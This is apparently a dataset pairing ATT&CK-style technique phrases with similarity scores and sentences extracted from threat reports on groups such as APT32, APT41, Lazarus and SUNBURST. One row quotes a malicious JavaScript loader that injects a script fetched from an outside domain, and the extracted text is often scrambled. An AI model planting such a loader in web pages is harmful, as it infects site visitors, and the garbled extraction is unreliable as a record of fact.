phrase|similarity|adjacent_sentences
An adversary may compress and/or encrypt data that is collected prior to exfiltration.|0.8166324374517832|"['Exploit Public-Facing Adversaries may attempt to exploit a weakness in an Internet- T1190 Application facing host or system to initially access a network.', 'Page 45 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may attempt to gather information on domain trust Domain Trust Discovery T1482 relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.', 'Adversaries may establish persistence and elevate privileges by Installer Packages T1546.016 using an installer to trigger the execution of malicious content.', 'Adversaries may execute their own malicious payloads by Dynamic Linker Hijacking T1547.006 hijacking environment variables the dynamic linker uses to load shared libraries.', 'Inter-Process Adversaries may abuse inter-process communication (IPC) T1559 Communication mechanisms for local code or command execution.', 'An adversary may compress and/or encrypt data that is collected Archive Collected Data T1560.003 prior to exfiltration.', 'Adversaries may attempt to hide artifacts associated with their Hide Artifacts T1564 behaviors to evade detection.', 'Adversaries may abuse the Windows service control manager to Service Execution T1569.002 execute malicious commands or payloads.', 'Adversaries may transfer tools or other files between systems in Lateral Tool Transfer T1570 a compromised environment.', 'Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid Protocol Tunneling T1572 detection/network filtering and/or enable access to otherwise unreachable systems.', 'Adversaries may employ a known encryption algorithm to conceal Encrypted Channel T1573 command and control traffic rather than relying on any inherent protections provided by a communication protocol.']"
Once established within a system or network, an adversary may use automated techniques for collecting internal data.|0.8605675290658924|['To disguise the source of malicious traffic, adversaries may chain Multi-hop Proxy T1090.003 together multiple proxies.', 'Adversaries may use an OSI non-application layer protocol for Non-Application Layer T1095 communication between host and C2 server or among infected Protocol hosts within a network.', 'Adversaries may create multiple stages for command and control Multi-Stage Channels T1104 that are employed under different conditions or for certain functions.', 'Adversaries may interact with the native OS application Native API T1106 programming interface (API) to execute behaviors.', 'Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove Modify Registry T1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution.', 'Once established within a system or network, an adversary may Automated Collection T1119 use automated techniques for collecting internal data.', 'Adversaries may encode data to make the content of command Data Encoding T1132 and control traffic more difficult to detect.', 'Adversaries may encode data with a non-standard data encoding Non-Standard Encoding T1132.002 system to make the content of command and control traffic more difficult to detect.', 'Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to Network Share Discovery T1135 gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.', 'Deobfuscate/Decode Files Adversaries may use Obfuscated Files or Information to hide T1140 or Information artifacts of an intrusion from analysis.', 'Exploit Public-Facing Adversaries may attempt to exploit a weakness in an Internet- T1190 Application facing host or system to initially access a network.']
APT38 has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources.|0.8066530274749938|['EnterpriseT1071.001Application Layer Protocol:Web ProtocolsAPT38used a backdoor, QUICKRIDE, to communicate to the C2 server over HTTP and HTTPS.', '[2]EnterpriseT1217Browser Information DiscoveryAPT38has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources.', '[1]EnterpriseT1110Brute ForceAPT38has used brute force techniques to attempt account access when passwords are unknown or when password hashes are unavailable.', '[1]EnterpriseT1115Clipboard DataAPT38used a Trojan called KEYLIME to collect data from the clipboard.', '[2]EnterpriseT1059.001Command and Scripting Interpreter:PowerShellAPT38has used PowerShell to execute commands and other operational tasks.', '[1].003Command and Scripting Interpreter:Windows Command ShellAPT38has used a command-line tunneler, NACHOCHEESE, to give them shell access to a victims machine.', '[2].005Command and Scripting Interpreter:Visual BasicAPT38has used VBScript to execute commands and other operational tasks.']
Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries.|0.843561094732999|['Since multiple techniques can be mapped to any confirmed threat, the percentages below add up to more than 100 percent.', 'T1059 Command 1 24% of total threats and Scripting Interpreter T1218 Signed Binary 2 19% Process Execution T1543 Create and 3 16% Modify System Process 4 16% T1053 Scheduled Task / Job 5 7% T1003 OS Credential Dumping 6 7% T1055 Process Injection T1027 Obfuscated Files 7 6% or Information 8 5% T1105 Ingress Tool Transfer 9 4% T1569 System Services 10 4% T1036 Masquerading l 10 Top Techniques2021 Threat Detection Report TECHNIQUE T1059 Command and #1 Scripting Interpreter OVERALL RANK Command and Scripting Interpreter tops our list this year thanks in large part to detections associated with two of its sub-techniques: PowerShell and Windows Command Shell.', '72.2% ORGANIZATIONS AFFECTED T1059.001 PowerShell 48.7% 2,366 4,798 ORGANIZATIONS AFFECTED CONFIRMED THREATS PowerShell was the most common technique we observed in 2020, CONFIRMED THREATS affecting nearly half of our customers.', 'It remains among the most versatile of built-in utilities for adversaries, defenders, and system administrators alike.', 'SEE MORE > T1059.003 Windows Command Shell 38.4% 1,984 ORGANIZATIONS AFFECTED CONFIRMED THREATS While it doesnt do much on its own, Windows Command Shell can call on virtually any executable on the system to execute batch files and arbitrary tasks.', 'SEE MORE > T1059: COMMAND AND SCRIPTING Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries.', 'These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms.', 'Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.', '11 SEUQINHCET-BUS TNELAVERP l 11 T1059: Command and Scripting Interpreter2021 Threat Detection Report TECHNIQUE T1059.001 PowerShell #1 PowerShell was the most common technique we observed in 2020, affecting PARENT TECHNIQUE RANK nearly half of our customers.', 'It remains among the most versatile of built-in utilities for adversaries, defenders, and system administrators alike.', '48.7% Analysis ORGANIZATIONS AFFECTED Why do adversaries use PowerShell?']
Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.|0.8443091975211341|"['If the browser version contains a vulnerability, corresponding exploitation code gets run on the target system, potentially giving the attacker a remote code execution ability.', 'For these types of attacks, adversaries often leverage JavaScript.', 'For instance, according to a malware analysis report performed by Palo Alto, analyzing threat samples from April 2022 to June 2022, among all of the web threats detected during the research, JavaScript downloaders and redirectors were in the top 5 most leveraged web threats, infecting around 300 different domains [31].', 'Analysis shows that attackers often inject malicious JavaScript downloaders to a webpage owned by them, creating several new script elements that redirect website visitors to ads, spams, or any other malicious domains such as train[.]developfirstline[.', ']com: .', '.', '.', 'Element.prototype.appendAfter = function(element) { element.parentNode.insertBefore(this, element.nextSibling) ), false(function () { var elem = document.createElement(\'script"") elem.type = \'text / javascript\' elem.sc = \'https://train.developfirstline.com/delivery.js?s=3\' elem.appendAfter(document.getElementsByTagName(\'script\')(0]) elem.appendAfter(document.getElementsByTagName(""\'head\')[0]) document.getElementsByTagName(\'head\')(01.appendChild(elem) .', '.', '.', '37#1.8.']"
Whitefly has used search order hijacking to run the loader Vcrodat.|0.8332628157610411|"['To date, Whitefly has attacked organizations in the healthcare, media, telecommunications, and engineering sectors.', 'How Whitefly compromises its victims https://www.symantec.com/blogs/threat-intelligence/whitefly-espionage-singapore 1/43/7/2019 Whitefly: Espionage Group has Singapore in Its Sights | Symantec Blogs Whitefly first infects its victims using a dropper in the form of a malicious .exe or .dll file that is disguised as a document or image.', 'These files frequently purport to offer information on job openings or appear to be documents sent from another organization operating in the same industry as the victim.', 'Given the nature of disguise, its highly likely that they are sent to the victim using spear-phishing emails.', 'If opened, the dropper runs a loader known as Trojan.Vcrodat on the computer.', 'Whitefly has consistently used a technique known as search order hijacking to run Vcrodat.', 'This technique takes advantage of the fact that Windows does not require an application to provide a specific path for a DLL that it wishes to load.', 'If no path is provided, Windows searches for the DLL in specific locations on the computer in a pre-defined order.', 'Attackers can therefore give a malicious DLL the same name as a legitimate DLL but place it ahead of the legitimate version in the search order so that it will be loaded when Windows searches for it.', 'Whitefly frequently delivers Vcrodat as a malicious DLL that has the same name as DLLs belonging to legitimate software from various security vendors.', 'The group leverages search order hijacking to assure that its malicious DLLs will be executed.']"
The group also side-loads its backdoor by dropping a library and a legitimate, signed executable .|0.8132535000509582|"['[6].002Email AddressesAPT32has collected e-mail addresses for activists and bloggers in order to target them with spyware.', ""[6]EnterpriseT1564.001Hide Artifacts:Hidden Files and DirectoriesAPT32's macOS backdoor hides the clientID file via a chflags function."", '[10].003Hide Artifacts:Hidden WindowAPT32has used the WindowStyle parameter to concealPowerShellwindows.', '[1][8].004Hide Artifacts:NTFS File AttributesAPT32used NTFS alternate data streams to hide their payloads.', '[8]EnterpriseT1574.002Hijack Execution Flow:DLL Side-LoadingAPT32ran legitimately-signed executables from Symantec and McAfee which load a malicious DLL.', 'The group also side-loads its backdoor by dropping a library and a legitimate, signed executable (AcroTranscoder).', '[4][8][5]EnterpriseT1070.001Indicator Removal:Clear Windows Event LogsAPT32has cleared select event log entries.', '[1].004Indicator Removal:File DeletionAPT32\'s macOS backdoor can receive a ""delete"" command.', '[10].006Indicator Removal:TimestompAPT32has used scheduled task raw XML with a backdated timestamp of June 2, 2016.', 'The group has also set the creation time of the files dropped by the second stage of the exploit to match the creation time of kernel32.dll.', 'Additionally,APT32has used a random value to modify the timestamp of the file storing the clientID.']"
SUNBURST used DNS for C2 traffic designed to mimic normal SolarWinds API communications.|0.778948725266449|['1/9Figure 1: SolarWinds digital signature on software with backdoor Multiple trojanzied updates were digitally signed from March - May 2020 and posted to the SolarWinds updates website, including: hxxps://downloads.solarwinds[.', ']com/solarwinds/CatalogResources/Core/2019.4/2019.4.5220.20574/SolarWinds- Core-v2019.4.5220-Hotfix5.msp The trojanized update file is a standard Windows Installer Patch file that includes compressed resources associated with the update, including the trojanized SolarWinds.Orion.Core.BusinessLayer.dll component.', 'Once the update is installed, the malicious DLL will be loaded by the legitimate SolarWinds.BusinessLayerHost.exe or SolarWinds.BusinessLayerHostx64.exe (depending on system configuration).', 'After a dormant period of up to two weeks, the malware will attempt to resolve a subdomain of avsvmcloud[.]com.', 'The DNS response will return a CNAME record that points to a Command and Control (C2) domain.', 'The C2 traffic to the malicious domains is designed to mimic normal SolarWinds API communications.', 'The list of known malicious infrastructure is available on FireEyes GitHub page.', 'Worldwide Victims Across Multiple Verticals FireEye has detected this activity at multiple entities worldwide.', 'The victims have included government, consulting, technology, telecom and extractive entities in North America, Europe, Asia and the Middle East.', 'We anticipate there are additional victims in other countries and verticals.', 'FireEye has notified all entities we are aware of being affected.']
Adversaries may encode data to make the content of command and control traffic more difficult to detect.|0.8598647414193625|"['Adversaries may use an OSI non-application layer protocol for Non-Application Layer T1095 communication between host and C2 server or among infected Protocol hosts within a network.', 'Adversaries may create multiple stages for command and control Multi-Stage Channels T1104 that are employed under different conditions or for certain functions.', 'Adversaries may interact with the native OS application Native API T1106 programming interface (API) to execute behaviors.', 'Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove Modify Registry T1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution.', 'Once established within a system or network, an adversary may Automated Collection T1119 use automated techniques for collecting internal data.', 'Adversaries may encode data to make the content of command Data Encoding T1132 and control traffic more difficult to detect.', 'Adversaries may encode data with a non-standard data encoding Non-Standard Encoding T1132.002 system to make the content of command and control traffic more difficult to detect.', 'Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to Network Share Discovery T1135 gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.', 'Deobfuscate/Decode Files Adversaries may use Obfuscated Files or Information to hide T1140 or Information artifacts of an intrusion from analysis.', 'Exploit Public-Facing Adversaries may attempt to exploit a weakness in an Internet- T1190 Application facing host or system to initially access a network.', 'Page 45 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may attempt to gather information on domain trust Domain Trust Discovery T1482 relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.']"
Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities.|0.7921129789397879|"['Configure authentication mechanisms to confirm certain user activities on systems, including registering new devices.', ""Page 22 of 27 | Product ID: AA23-347A TLP:CLEARTLP:CLEAR International Partnership VALIDATE SECURITY CONTROLS In addition to applying mitigations, FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory."", 'FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.', 'To get started: 1.', 'Select an ATT&CK technique described in this advisory (see previous tables).', '2.', 'Align your security technologies against the technique.', '3.', 'Test your technologies against the technique.', '4.', 'Analyze your detection and prevention technologies performance.']"
APT32 has stood up websites containing numerous articles and content scraped from the Internet to make them appear legitimate, but some of these pages include malicious JavaScript to profile the potential victim or infect them via a fake software update.|0.8190387488807642|['The group has also used thepingcommand.', '[8]EnterpriseT1053.005Scheduled Task/Job:Scheduled TaskAPT32has used scheduled tasks to persist on victim systems.', '[1][4][8][5]EnterpriseT1505.003Server Software Component:Web ShellAPT32has used Web shells to maintain access to victim websites.', '[2]EnterpriseT1072Software Deployment ToolsAPT32compromised McAfee ePO to move laterally by distributing malware as a software deployment task.', '[1]EnterpriseT1608.001Stage Capabilities:Upload MalwareAPT32has hosted malicious payloads in Dropbox, Amazon S3, and Google Drive for use during targeting.', '[9].004Stage Capabilities:Drive-by TargetAPT32has stood up websites containing numerous articles and content scraped from the Internet to make them appear legitimate, but some of these pages include malicious JavaScript to profile the potential victim or infect them via a fake software update.', '[9]EnterpriseT1218.005System Binary Proxy Execution:MshtaAPT32has used mshta.exe for code execution.', '[4][8].010System Binary Proxy Execution:Regsvr32APT32created aScheduled Task/Jobthat used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory.', 'The group has also used regsvr32 to run their backdoor.', '[5][1][8].011System Binary Proxy Execution:Rundll32APT32malware has used rundll32.exe to execute an initial infection process.', '[8]EnterpriseT1082System Information DiscoveryAPT32has collected the OS version and computer name from victims.']
This method may also evade detection from security products since the execution is masked under a legitimate process.|0.7849083367753802|['access; the resurrection of Emotet, a threat described by Europol as the most dangerous malware in You can listen to the latest episodes via the most popular podcast platforms including Spotify the world; and the over 400-fold increase in Android banking malware year-over-year.', '[154], Google Podcasts [155], Apple Podcasts [156] and PodBean [157].', 'MITRE ATT&CK CONTRIBUTIONS ESET researchers regularly contribute to MITRE ATT&CK [158] a globally accessible knowledge base of adversary tactics and techniques.', 'In T1 2022, ESETs Process Injection: ListPlanting [159] contribution was added to the ATT&CK knowledge base.', 'ListPlanting is a method of executing arbitrary code in the address space of a separate live process.', 'Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.', 'InvisiMole uses ListPlanting to inject code into a trusted process.', 'InvisiMole [160] is a modular spyware program that has been used by the InvisiMole APT group since WHITE PAPERS at least 2013.', 'The InvisiMole group also has two backdoor modules called RC2FM and RC2CL that are used to perform post-exploitation activities.', 'It has been discovered on compromised victims in Ukraine and Russia.', 'Gamaredon group [161] infrastructure has been used to download and execute Under the hood of Wslinks multilayered virtual machine [36] the InvisiMole spyware against a small number of victims.']
DLL injection is a method of executing arbitrary code in the address space of a separate live process.|0.7913453486934843|['Among others, his presentation who is talking to researchers, introducing them and their discoveries and offering the listeners a peek covered the hundreds of billions of password guesses aimed to break the protection of RDP remote behind the curtain of how their research came to be.', 'access; the resurrection of Emotet, a threat described by Europol as the most dangerous malware in You can listen to the latest episodes via the most popular podcast platforms including Spotify the world; and the over 400-fold increase in Android banking malware year-over-year.', '[154], Google Podcasts [155], Apple Podcasts [156] and PodBean [157].', 'MITRE ATT&CK CONTRIBUTIONS ESET researchers regularly contribute to MITRE ATT&CK [158] a globally accessible knowledge base of adversary tactics and techniques.', 'In T1 2022, ESETs Process Injection: ListPlanting [159] contribution was added to the ATT&CK knowledge base.', 'ListPlanting is a method of executing arbitrary code in the address space of a separate live process.', 'Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.', 'InvisiMole uses ListPlanting to inject code into a trusted process.', 'InvisiMole [160] is a modular spyware program that has been used by the InvisiMole APT group since WHITE PAPERS at least 2013.', 'The InvisiMole group also has two backdoor modules called RC2FM and RC2CL that are used to perform post-exploitation activities.', 'It has been discovered on compromised victims in Ukraine and Russia.']
Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.|0.9688273929255937|['T1094 Custom Adversaries may communicate using a custom command and Command and control protocol instead of encapsulating commands/data in an Control Protocol existing Standard Application Layer Protocol.', 'Implementations include mimicking well-known protocols or developing custom protocols (including raw sockets) on top of fundamental protocols provided by TCP/IP/another standard network stack.', 'T1024 Custom Adversaries may use a custom cryptographic protocol or algorithm Cryptographic to hide command and control traffic.', 'A simple scheme, such as Protocol XOR-ing the plaintext with a fixed key, will produce a very weak ciphertext.', 'Copyright Leonardo S.p.a. All rights reserved 23 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 T1032 Standard Adversaries may explicitly employ a known encryption algorithm to Cryptographic conceal command and control traffic rather than relying on any Protocol inherent protections provided by a communication protocol.', 'Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.', 'T1158 Hidden Files To prevent normal users from accidentally changing special files on and Directories a system, most operating systems have the concept of a hidden file.', 'These files dont show up when a user browses the file system with a GUI or when using normal commands on the command line.', 'Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls a for Linux and macOS).', 'T1222 File and File and directory permissions are commonly managed by Directory discretionary access control lists (DACLs) specified by the file or Permissions directory owner.', 'File and directory DACL implementations may vary Modification by platform, but generally explicitly designate which users/groups can perform which actions (ex: read, write, execute, etc.).']
They have also used zero-day exploits.|0.7974875236590371|['By calling the bytesavailable method within the PostScript code, arbitrary code execution is achieved.', 'Identity Although the exact identity of PLATINUM remains unknown, the technical indicators observed so far can help create a profile of the attacker.', 'Usage of multiple backdoors.', 'The different backdoors written by or for the group indicate a considerable investment over time.', 'Research indicates that PLATINUM has used multiple backdoors concurrently at times, which could represent either multiple teams within the activity group performing different campaigns, or different versions of the tools being used against varying victim networks.', 'Zero day exploits.', 'PLATINUM has used several zero-day exploits against their victims.', 'Regardless of whether they researched the exploits themselves or purchased them from independent researchers, the monetary investment required to collect and deploy zero-day exploits at this level is considerable.', 'Victim geography.', 'More often than not, research into targeted attacks shows The monetary in- activity groups becoming opportunistic and attacking topical targets; that is, targets considered valuable based on the geopolitical events of the year.', 'vestment required PLATINUM has consistently targeted victims within a small set of countries in to collect and South and Southeast Asia.']
Cobalt Group had exploited multiple vulnerabilities for execution, including Microsofts Equation Editor , an Internet Explorer vulnerability , CVE-2017-8570, CVE-2017-0199, and CVE-2017-8759.|0.7899007940919546|"['[11]The group has used an exploit toolkit known as Threadkit that launches .bat files.', '[1][2][4][11][13][12].005Command and Scripting Interpreter:Visual BasicCobalt Grouphas sent Word OLE compound documents with malicious obfuscated VBA macros that will run upon user execution.', ""[1][2][4][11][13][12].007Command and Scripting Interpreter:JavaScriptCobalt Grouphas executed JavaScript scriptlets on the victim's machine."", '[1][2][4][11][13][12]EnterpriseT1543.003Create or Modify System Process:Windows ServiceCobalt Grouphas created new services to establish persistence.', '[4]EnterpriseT1573.002Encrypted Channel:Asymmetric CryptographyCobalt Grouphas used the Plink utility to create SSH tunnels.', '[4]EnterpriseT1203Exploitation for Client ExecutionCobalt Grouphad exploited multiple vulnerabilities for execution, including Microsofts Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, CVE-2017-0199, and CVE-2017-8759.', '[1][2][3][5][6][7][10][12]EnterpriseT1068Exploitation for Privilege EscalationCobalt Grouphas used exploits to increase their levels of rights and privileges.', '[4]EnterpriseT1070.004Indicator Removal:File DeletionCobalt Groupdeleted the DLL dropper from the victims machine to cover their tracks.', '[1]EnterpriseT1105Ingress Tool TransferCobalt Grouphas used public sites such as github.com and sendspace.com to upload files and then download them to victim computers.', ""[2][3]The group's JavaScript backdoor is also capable of downloading files."", '[11]EnterpriseT1559.002Inter-Process Communication:Dynamic Data ExchangeCobalt Grouphas sent malicious Word OLE compound documents to victims.']"
APT41 leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396.|0.7591248430059332|['[1]EnterpriseT1005Data from Local SystemPatchworkcollected and exfiltrated files from the infected system.', '[1]EnterpriseT1074.001Data Staged:Local Data StagingPatchworkcopied all targeted files to a directory called index that was eventually uploaded to the C&C server.', '[3]EnterpriseT1587.002Develop Capabilities:Code Signing CertificatesPatchworkhas created self-signed certificates from fictitious and spoofed legitimate software companies that were later used to sign malware.', '[6]EnterpriseT1189Drive-by CompromisePatchworkhas used watering holes to deliver files with exploits to initial victims.', '[2][4]EnterpriseT1203Exploitation for Client ExecutionPatchworkuses malicious documents to deliver remote execution exploits as part of.', 'The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, CVE-2017-11882, and CVE-2015-1641.', '[1][8][2][5][3][4][6]EnterpriseT1083File and Directory DiscoveryAPatchworkpayload has searched all fixed drives on the victim for files matching a specified list of extensions.', '[1][3]EnterpriseT1574.002Hijack Execution Flow:DLL Side-LoadingAPatchwork.dll that containsBADNEWSis loaded and executed using DLL side-loading.', '[3]EnterpriseT1070.004Indicator Removal:File DeletionPatchworkremoved certain files and replaced them so they could not be retrieved.', '[3]EnterpriseT1105Ingress Tool TransferPatchworkpayloads download additional files from the C2 server.', '[8][3]EnterpriseT1559.002Inter-Process Communication:Dynamic Data ExchangePatchworkleveraged the DDE protocol to deliver their malware.']
APT41 leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396.|0.8685022251060389|['[5]EnterpriseT1041Exfiltration Over C2 ChannelDuringC0017,APT41used its Cloudflare services C2 channels for data exfiltration.', '[5]EnterpriseT1567Exfiltration Over Web ServiceDuringC0017,APT41used Cloudflare services for data exfiltration.', '[5]EnterpriseT1190Exploit Public-Facing ApplicationAPT41exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central through unsafe deserialization, and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices.', '[7]APT41leveraged vulnerabilities such as ProxyLogon exploitation or SQL injection for initial access.', '[6]DuringC0017,APT41exploited CVE-2021-44207 in the USAHerds application and CVE-2021-44228 in Log4j, as well as other .NET deserialization, SQL injection, and directory traversal vulnerabilities to gain initial access.', '[5]EnterpriseT1203Exploitation for Client ExecutionAPT41leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396.', '[1]EnterpriseT1068Exploitation for Privilege EscalationDuringC0017,APT41abused named pipe impersonation for privilege escalation.', '[5]EnterpriseT1133External Remote ServicesAPT41compromised an online billing/payment service using VPN access between a third-party service provider and the targeted payment service.', '[1]EnterpriseT1008Fallback ChannelsAPT41used the Steam community page as a fallback mechanism for C2.', '[1]EnterpriseT1083File and Directory DiscoveryAPT41has executedfile /bin/pwdon exploited victims, perhaps to return architecture related information.', '[7]EnterpriseT1589.001Gather Victim Identity Information:CredentialsTo support initial access,APT41gained access to databases with information about existing accounts as well as plaintext and hashed passwords.']
The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.|1.0002|"['[8]EnterpriseT1005Data from Local SystemFIN6has collected and exfiltrated payment card data from compromised systems.', '[7][9][10]EnterpriseT1074.002Data Staged:Remote Data StagingFIN6actors have compressed data from remote systems and moved it to another staging system before exfiltration.', '[1]EnterpriseT1573.002Encrypted Channel:Asymmetric CryptographyFIN6used the Plink command-line utility to create SSH tunnels to C2 servers.', '[1]EnterpriseT1048.003Exfiltration Over Alternative Protocol:Exfiltration Over Unencrypted Non-C2 ProtocolFIN6has sent stolen payment card data to remote servers via HTTP POSTs.', '[7]EnterpriseT1068Exploitation for Privilege EscalationFIN6has used tools to exploit Windows vulnerabilities in order to escalate privileges.', 'The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.', '[1]EnterpriseT1562.001Impair Defenses:Disable or Modify ToolsFIN6has deployed a utility script namedkill.batto disable anti-virus.', '[2]EnterpriseT1070.004Indicator Removal:File DeletionFIN6has removed files from victim machines.', '[1]EnterpriseT1036.004Masquerading:Masquerade Task or ServiceFIN6has renamed the ""psexec"" service name to ""mstdc"" to masquerade as a legitimate Windows service.', ""[2]EnterpriseT1046Network Service DiscoveryFIN6used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS."", '[1]EnterpriseT1095Non-Application Layer ProtocolFIN6has used Metasploit Bind and Reverse TCP stagers.']"
MuddyWater has used a series of compromised websites that victims connected to randomly to relay information to command and control .|0.9277191031037945|['Collection Screen Capture T1113 MuddyWater has used malware that can capture screenshots of the victims machine.', 'Archive Collected T1560.001 MuddyWater has used the native Windows cabinet creation tool, makecab.exe , Data: Archive via likely to compress stolen data to be uploaded.', 'Utility Command and Control Application Layer T1071.001 MuddyWater has used HTTP for C2 communications.', 'e.g., Small Sieve beacons and Protocol: Web tasking are performed using the Telegram API over HTTPS.', 'Protocols Proxy: External T1090.002 MuddyWater has controlled POWERSTATS from behind a proxy network to Proxy obfuscate the C2 location.', 'MuddyWater has used a series of compromised websites that victims connected to randomly to relay information to C2.', '6/12Technique Title ID Use Web Service: T1102.002 MuddyWater has used web services including OneHub to distribute remote access Bidirectional tools.', 'Communication Multi-Stage T1104 MuddyWater has used one C2 to obtain enumeration scripts and monitor web logs, Channels but a different C2 to send data back.', 'Ingress Tool Transfer T1105 MuddyWater has used malware that can upload additional files to the victims machine.', 'Data Encoding: T1132.001 MuddyWater has used tools to encode C2 communications including Base64 Standard Encoding encoding.', 'Data Encoding: Non- T1132.002 MuddyWater uses tools such as Small Sieve, which employs a custom hex byte Standard Encoding swapping encoding scheme to obfuscate tasking traffic.']
Lazarus Group malware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random, and if the transmission fails, chooses a new C2 server to attempt the transmission again.|0.7960214353797384|['[9]EnterpriseT1048.003Exfiltration Over Alternative Protocol:Exfiltration Over Unencrypted Non-C2 ProtocolLazarus Groupmalware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims.', '[3][25]EnterpriseT1041Exfiltration Over C2 ChannelLazarus Grouphas exfiltrated data and files over a C2 channel through its various tools and malware.', '[3][24][18]DuringOperation Dream Job,Lazarus Groupexfiltrated data from a compromised host to actor-controlled C2 servers.', '[10]EnterpriseT1567.002Exfiltration Over Web Service:Exfiltration to Cloud StorageDuringOperation Dream Job,Lazarus Groupused a custom build of open-source command-line dbxcli to exfiltrate stolen data to Dropbox.', '[9][10]EnterpriseT1203Exploitation for Client ExecutionLazarus Grouphas exploited Adobe Flash vulnerability CVE-2018-4878 for execution.', '[29]EnterpriseT1008Fallback ChannelsLazarus Groupmalware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random, and if the transmission fails, chooses a new C2 server to attempt the transmission again.', '[3][25]EnterpriseT1083File and Directory DiscoveryLazarus Groupmalware can use a common function to identify target files by their extension, and some also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives.', '[3][27][21][22]DuringOperation Dream Job,Lazarus Groupconducted word searches within documents on a compromised host in search of security and financial matters.', '[10]EnterpriseT1589.002Gather Victim Identity Information:Email AddressesLazarus Groupcollected email addresses belonging to various departments of a targeted organization which were used in follow-on phishing campaigns.', '[17]EnterpriseT1591Gather Victim Org InformationLazarus Grouphas studied publicly available information about a targeted organization to tailor spearphishing efforts against specific departments and/or individuals.', '[17]ForOperation Dream Job,Lazarus Groupgathered victim organization information to identify specific targets.']
APT29 routinely removed their tools, including custom backdoors, once remote access was achieved.|0.7894718944811254|['The credentials used for lateral movement were always different from those used for remote access.', 'Detection Opportunity Organizations can use HXs LogonTracker module to graph all logon activity and analyze systems displaying a one-to- many relationship between source systems and accounts.', 'This will uncover any single system authenticating to multiple systems with multiple accounts, a relatively uncommon occurrence during normal business operations.', 'Temporary File Replacement and Temporary Task Modification The attacker used a temporary file replacement technique to remotely execute utilities: they replaced a legitimate utility with theirs, executed their payload, and then restored the legitimate original file.', 'They similarly manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returning the scheduled task to its original configuration.', 'They routinely removed their tools, including removing backdoors once legitimate remote access was achieved.', 'Detection Opportunity Defenders can examine logs for SMB sessions that show access to legitimate directories and follow a delete-create- execute-delete-create pattern in a short amount of time.', 'Additionally, defenders can monitor existing scheduled tasks for temporary updates, using frequency analysis to identify anomalous modification of tasks.', 'Tasks can also be monitored to watch for legitimate Windows tasks executing new or unknown binaries.', 'This campaigns post compromise activity was conducted with a high regard for operational security, in many cases leveraging dedicated infrastructure per intrusion.', 'This is some of the best operational security that FireEye has observed in a cyber attack, focusing on evasion and leveraging inherent trust.']
